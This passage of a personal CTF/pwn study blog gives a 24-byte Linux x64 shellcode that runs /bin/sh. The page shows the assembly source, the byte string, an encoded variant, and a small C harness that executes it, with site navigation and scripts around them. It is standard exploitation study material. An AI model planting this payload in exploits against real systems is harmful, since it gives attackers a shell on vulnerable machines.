+<p>Linux/x64 - Execute /bin/sh Shellcode (24 bytes)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">	push 59</span><br><span class="line">	pop rax</span><br><span class="line">	cdq</span><br><span class="line">	push rdx</span><br><span class="line">	mov rbx,0x68732f6e69622f2f</span><br><span class="line">	push rbx</span><br><span class="line">	push rsp</span><br><span class="line">	pop rdi</span><br><span class="line">	push rdx</span><br><span class="line">	push rdi</span><br><span class="line">	push rsp</span><br><span class="line">	pop rsi</span><br><span class="line">	syscall</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char code[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span><br><span class="line">// char code[] = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;len:%d bytes\n&quot;, strlen(code));</span><br><span class="line">    (*(void(*)()) code)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  
+	  </div>
+		  <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/笔记/">笔记</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/笔记/">笔记</a><a href="/tags/栈/">栈</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	  </article>
+	  
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/10/13/ubuntu18/ubuntu18/" title="ubuntu18安装各种pwn工具">
+  <span>
+  ubuntu18安装各种pwn工具</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/10/03/buu/wppp/"  title="buuctf pwn wp【长期更】">
+ <span>buuctf pwn wp【长期更】
+</span>
+</a>
+</div>
+
+</nav>
+
+	  
+
+</div> 
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/ACM/" title="ACM">ACM<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>16</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>12</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆/" title="堆">堆<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/栈/" title="栈">栈<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/iot/" title="iot">iot<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IO/" title="IO">IO<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/HDU/" title="HDU">HDU<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/canary/" title="canary">canary<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://whali3n51.github.io" target="_blank" title="whali3n51">whali3n51</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+
+	<p class="copyright">
+	Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2020 
+	
+	<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+	
+	
+	</p>
+</div></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
